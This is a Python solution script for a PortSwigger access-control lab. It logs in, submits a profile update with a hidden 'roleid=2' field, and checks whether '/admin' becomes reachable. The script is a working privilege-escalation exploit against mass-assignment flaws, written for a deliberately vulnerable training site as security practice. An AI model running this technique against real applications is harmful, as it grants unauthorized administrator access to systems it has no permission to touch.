# Lab 04 — User role can be modified in user profile
# PortSwigger: https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile
#
# Vulnerability: Profile update endpoint accepts a roleid field the client
#                isn't shown in the UI, but the server still processes it
# Aim:           Escalate your own account to admin via the profile update form
#
# Technique:
#   Submit a normal profile update (e.g. change email). Inspect the FULL
#   request body — a roleid (or similar) field is present even though the
#   UI never exposes it for editing. Try different integer values until one
#   grants admin privileges.
#
# Usage: python access_control_lab04.py <url>

import sys
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, login, check_status, get_csrf_from_response

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 04 — USER ROLE MODIFIABLE IN USER PROFILE (roleid PARAMETER)")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab04.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: inspect the account page to find the update form/CSRF ───────
    print("\n  ── Step 1: fetch account page, get CSRF token for the update form\n")
    r = session.get(f"{url}/my-account")
    csrf = get_csrf_from_response(r.text)

    # ── Step 2: try submitting the update WITH an added roleid field ─────────
    print("  ── Step 2: submit profile update with roleid=2 (likely admin)\n")
    data = {
        "email": "wiener@example.com",
        "roleid": "2",
    }
    if csrf:
        data["csrf"] = csrf

    r2 = session.post(f"{url}/my-account/change-email", data=data, allow_redirects=True)
    check_status(r2, [200, 302], "Profile update with roleid=2")

    # ── Step 3: verify escalation by checking access to /admin ───────────────
    print("\n  ── Step 3: verify escalation by attempting to access /admin\n")
    r3 = session.get(f"{url}/admin")
    check_status(r3, 200, "Access to /admin after roleid change")

    if r3.status_code == 200:
        print("  ✔  Privilege escalation confirmed — account is now admin")
    else:
        print("  ?  roleid=2 didn't work — try other integer values (0, 1, 3...)")
        print("     The exact mapping of roleid → role is lab-specific.")

    print()
    print("  ℹ  The UI never shows a roleid field, but the backend still")
    print("     processes it blindly if present in the request body.")
